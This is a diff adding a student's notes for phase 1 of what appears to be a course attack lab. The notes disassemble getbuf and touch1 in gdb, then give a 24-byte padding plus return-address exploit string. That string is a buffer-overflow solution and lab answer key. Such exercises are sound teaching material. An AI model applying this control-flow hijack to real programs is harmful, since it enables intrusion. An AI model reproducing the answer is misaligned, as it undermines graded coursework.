@@ -1,0 +1,35 @@
+Level 1: phase 1
+Want to change the return control of getbuf to reroute to touch1.
+want to overflow the buffer and be able to change the value stored in the return register
+cd target81
+gdb ctarget
+Disas getbuf
+getbuf()
+ 0x000000000040181b <+0>:     sub    $0x18,%rsp
+ 0x000000000040181f <+4>:     mov    %rsp,%rdi
+ 0x0000000000401822 <+7>:     callq  0x401a5a <Gets>
+ 0x0000000000401827 <+12>:    mov    $0x1,%eax
+ 0x000000000040182c <+17>:    add    $0x18,%rsp
+ 0x0000000000401830 <+21>:    retq
+Disas touch1()
+touch1()
+ 0x0000000000401831 <+0>:     sub    $0x8,%rsp
+ 0x0000000000401835 <+4>:     movl   $0x1,0x202cbd(%rip)        # 0x6044fc <vlevel>
+ 0x000000000040183f <+14>:    mov    $0x402fc2,%edi
+ 0x0000000000401844 <+19>:    callq  0x400c50 <puts@plt>
+ 0x0000000000401849 <+24>:    mov    $0x1,%edi
+ 0x000000000040184e <+29>:    callq  0x401c49 <validate>
+ 0x0000000000401853 <+34>:    mov    $0x0,%edi
+ 0x0000000000401858 <+39>:    callq  0x400df0 <exit@plt>
+need 24 bytes of whitespace padding in order to overflow the buffer
+need 24 byes because getbuf subtracts 0x18 to make room for the stack 
+0x18 = 24
+whitespace = 00
+once you overflow the buffer you need to store the address of touch1 into the return register
+therefore insead of just returning it reroutes to touch1 and executes touch1
+the address of touch1 is simply the first line of the disassembled code of touch1
+Solution:
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+31 18 40 00 00 00 00 00
